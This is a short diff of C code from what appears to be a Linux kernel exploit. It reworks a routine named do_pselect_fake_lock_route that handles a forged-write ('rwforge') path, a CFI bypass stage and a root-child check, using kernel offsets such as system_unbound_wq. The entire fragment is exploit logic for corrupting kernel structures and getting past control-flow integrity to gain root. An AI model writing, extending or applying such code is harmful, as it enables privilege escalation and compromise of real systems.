@@ -188,10 +188,6 @@ void do_pselect_fake_lock_route(void) {
 
   struct timespec route_t0;
   clock_gettime(CLOCK_MONOTONIC, &route_t0);
-  /* The caller clears the global route configuration as soon as this route
-   * reports completion.  Snapshot the mode so a delayed worker can never
-   * mistake a rwforge write for the generic CFI bootstrap path. */
-  const int custom_route = pselect_custom_write_enabled();
   int calls = 0;
   int success = 0;
   int route_verified = 0;
@@ -290,24 +286,22 @@ void do_pselect_fake_lock_route(void) {
 
     int route_quality_miss = 0;
     int route_signal = calls > 0 && success > 0;
-    int readiness_ok = ret == PSELECT_EXPECTED_READY;
     int cfi_probed = 0;
     if (route_signal) {
-      if (!readiness_ok) {
-        pr_info("pselect partial readiness attempt=%d ret=%d expected=%d\n",
+      cfi_probed = 1;
+      if (ret != PSELECT_EXPECTED_READY) {
+        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                 route_attempt, ret, PSELECT_EXPECTED_READY);
       }
-      if (custom_route) {
-        /* rwforge has its own owner/tee land checks.  Running try_cfi_stage()
-         * here can target a partially forged table and returned EINVAL on
-         * CZG1; it is unrelated to validating the constrained write. */
+      if (pselect_custom_write_enabled()) {
         cfi_last_step = 0;
         cfi_last_errno = 0;
         route_verified = 1;
-      } else if (!readiness_ok) {
-        cfi_last_step = 36;
-        cfi_last_errno = 0;
-      } else if ((cfi_probed = 1, try_cfi_stage())) {
+        if (active_offsets && active_offsets->off_system_unbound_wq &&
+            !root_child_done) {
+          try_cfi_stage();
+        }
+      } else if (try_cfi_stage()) {
         cfi_last_step = 0;
         route_verified = 1;
       } else if (!cfi_last_step) {
@@ -316,7 +310,7 @@ void do_pselect_fake_lock_route(void) {
     }
     if (!route_verified && route_signal) {
       route_quality_miss = 1;
-      if (!cfi_probed && cfi_last_step != 36) {
+      if (!cfi_probed) {
         cfi_last_step = 35;
         cfi_last_errno = saved_errno;
       }
